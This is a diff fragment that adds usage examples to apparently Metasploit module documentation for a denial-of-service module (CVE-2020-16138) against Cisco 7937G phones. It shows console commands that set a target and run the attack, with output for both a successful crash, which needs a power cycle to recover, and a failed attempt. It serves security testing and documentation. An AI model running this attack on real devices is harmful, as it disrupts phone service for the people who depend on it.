@@ -57,3 +57,42 @@ msf5 auxiliary(dos/cisco/cve_2020_16138) > run
 [-] 192.168.110.209 - Device doesn't appear to be functioning (already DoS'd?) or SSH is not enabled.
 [*] Auxiliary module execution completed
 ```
+
+### Cisco 7937G Running Firmware Version SCCP-1-4-5-5
+
+#### Successful Scenario:
+```
+msf5 > use auxiliary/dos/cisco/cve_2020_16138 
+msf5 auxiliary(dos/cisco/cve_2020_16138) > set rhost 192.168.110.209
+rhost => 192.168.110.209
+msf5 auxiliary(dos/cisco/cve_2020_16138) > run
+
+[*] Starting server...
+[*] 192.168.110.209 - Connected (version 2.0, client OpenSSH_4.3)
+[-] 192.168.110.209 - Exception: Incompatible ssh peer (no acceptable kex algorithm)
+[-] 192.168.110.209 - Traceback (most recent call last):
+[-] 192.168.110.209 -   File "/usr/lib/python3/dist-packages/paramiko/transport.py", line 2083, in run
+[-] 192.168.110.209 -     self._handler_table[ptype](self, m)
+[-] 192.168.110.209 -   File "/usr/lib/python3/dist-packages/paramiko/transport.py", line 2198, in _negotiate_keys
+[-] 192.168.110.209 -     self._parse_kex_init(m)
+[-] 192.168.110.209 -   File "/usr/lib/python3/dist-packages/paramiko/transport.py", line 2354, in _parse_kex_init
+[-] 192.168.110.209 -     raise SSHException(
+[-] 192.168.110.209 - paramiko.ssh_exception.SSHException: Incompatible ssh peer (no acceptable kex algorithm)
+[-] 192.168.110.209 - 
+[*] 192.168.110.209 - DoS non-reset attack completed!
+[*] 192.168.110.209 - Errors are intended.
+[*] 192.168.110.209 - Device must be power cycled to restore functionality.
+[*] Auxiliary module execution completed
+```
+
+#### Unsuccessful Scenario:
+```
+msf5 > use auxiliary/dos/cisco/cve_2020_16138 
+msf5 auxiliary(dos/cisco/cve_2020_16138) > set rhost 192.168.110.209
+rhost => 192.168.110.209
+msf5 auxiliary(dos/cisco/cve_2020_16138) > run
+
+[*] Starting server...
+[-] 192.168.110.209 - Device doesn't appear to be functioning (already DoS'd?) or SSH is not enabled.
+[*] Auxiliary module execution completed
+```
